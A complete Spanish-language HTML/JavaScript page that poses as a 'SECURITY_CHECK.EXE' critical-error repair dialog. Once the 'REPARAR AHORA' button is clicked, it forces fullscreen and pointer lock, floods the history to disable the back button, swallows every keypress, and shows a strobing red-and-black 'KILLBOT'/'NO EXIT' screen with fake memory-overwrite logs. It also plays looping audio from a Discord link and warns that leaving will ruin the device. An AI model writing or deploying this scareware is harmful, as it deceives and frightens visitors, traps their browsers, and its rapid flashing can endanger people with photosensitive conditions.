<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>SYSTEM_LOCK_ACTIVE</title>
    <style>
        * { box-sizing: border-box; -webkit-tap-highlight-color: transparent; outline: none; }
        body, html { 
            margin: 0; padding: 0; width: 100%; height: 100%; 
            background-color: #000; color: #f00; 
            font-family: 'Courier New', monospace; 
            overflow: hidden; user-select: none; touch-action: none;
        }

        /* Pantalla de Inicio */
        #setup-screen {
            display: flex; flex-direction: column; align-items: center; justify-content: center;
            height: 100%; background: #0a0a0a; z-index: 10; position: relative;
        }

        .window {
            width: 90%; max-width: 400px;
            background: #c0c0c0; border: 3px solid #fff;
            border-right-color: #555; border-bottom-color: #555;
            color: #000; padding: 2px;
        }

        .title-bar { background: #000080; color: #fff; padding: 5px; font-weight: bold; display: flex; justify-content: space-between; }

        .btn {
            background: #c0c0c0; border: 2px solid #fff; border-right-color: #555; border-bottom-color: #555;
            padding: 15px; cursor: pointer; font-weight: bold; width: 100%; margin-top: 15px;
        }

        /* Capa Killbot Inescapable */
        #kiosk-mode {
            position: fixed; top: 0; left: 0; width: 100vw; height: 100vh;
            background-color: #f00; display: none; z-index: 99999;
            cursor: none;
        }

        .glitch-text {
            position: absolute; font-size: 12vw; font-weight: 900;
            color: white; text-shadow: 5px 5px #000; pointer-events: none;
            animation: shake 0.05s infinite;
        }

        #log { position: absolute; bottom: 0; left: 0; font-size: 10px; color: #fff; pointer-events: none; padding: 10px; }

        @keyframes shake {
            0% { transform: translate(5px, -5px); }
            50% { transform: translate(-5px, 5px); }
            100% { transform: translate(0, 0); }
        }
    </style>
</head>
<body onclick="forceKiosk()">

    <div id="setup-screen">
        <div class="window">
            <div class="title-bar"><span>SECURITY_CHECK.EXE</span><span>[X]</span></div>
            <div class="content" id="win-content" style="padding:20px; text-align:center;">
                <p><b>ERROR CRÍTICO DETECTADO</b></p>
                <p>El sistema requiere reparación inmediata para evitar la pérdida de datos.</p>
                <button class="btn" id="start-btn">REPARAR AHORA</button>
            </div>
        </div>
    </div>

    <div id="kiosk-mode">
        <div id="log"></div>
    </div>

    <audio id="killbot-audio" loop>
        <source src="https://cdn.discordapp.com/attachments/1375609945017290836/1470865995227857067/killbot.mp3?ex=698cda34&is=698b88b4&hm=69b6785fada5757221116c6e5b9f379146692506138fc6c4f3a7ae2a4ae7ece8&" type="audio/mpeg">
    </audio>

    <script>
        const startBtn = document.getElementById('start-btn');
        const kiosk = document.getElementById('kiosk-mode');
        const audio = document.getElementById('killbot-audio');
        const log = document.getElementById('log');
        let active = false;

        function forceKiosk() {
            if (!active) return;
            const el = document.documentElement;
            if (el.requestFullscreen) el.requestFullscreen();
            if (document.body.requestPointerLock) document.body.requestPointerLock();
        }

        startBtn.addEventListener('click', () => {
            active = true;
            forceKiosk();
            audio.play();

            document.getElementById('win-content').innerHTML = "Intentando recuperar sectores dañados... <br> No apague el dispositivo.";
            
            // Llenar el historial para bloquear el botón de "Atrás" en Android
            for(let i=0; i<50; i++) {
                history.pushState({page: i}, "", "#virus_" + i);
            }

            setTimeout(() => {
                document.getElementById('setup-screen').style.display = 'none';
                kiosk.style.display = 'block';

                setInterval(() => {
                    spawnGlitch();
                    updateLog();
                    kiosk.style.backgroundColor = (Math.random() > 0.5) ? "#f00" : "#000";
                    if(Math.random() > 0.95) document.body.style.filter = "invert(1)";
                    else document.body.style.filter = "none";
                }, 40);
            }, 15000);
        });

        function spawnGlitch() {
            const t = document.createElement('div');
            t.className = 'glitch-text';
            t.innerText = ["NO EXIT", "KILLBOT", "STAY", "ERROR", "NULL"][Math.floor(Math.random()*5)];
            t.style.left = Math.random() * 80 + "vw";
            t.style.top = Math.random() * 80 + "vh";
            kiosk.appendChild(t);
            setTimeout(() => t.remove(), 300);
        }

        function updateLog() {
            const l = document.createElement('div');
            l.innerText = `OVERWRITING_MEMORY_ADDR_0x${Math.random().toString(16).slice(2,10)}`;
            log.appendChild(l);
            if(log.childNodes.length > 30) log.removeChild(log.firstChild);
        }

        // Bloqueos de teclado para Windows
        window.addEventListener('keydown', (e) => {
            if (active) {
                e.preventDefault();
                return false;
            }
        });

        // Anti-salida de pestaña
        window.onbeforeunload = function() {
            return "SISTEMA CORRUPTO. SI SALES, EL DISPOSITIVO QUEDARÁ INSERVIBLE.";
        };
    </script>
</body>
</html>
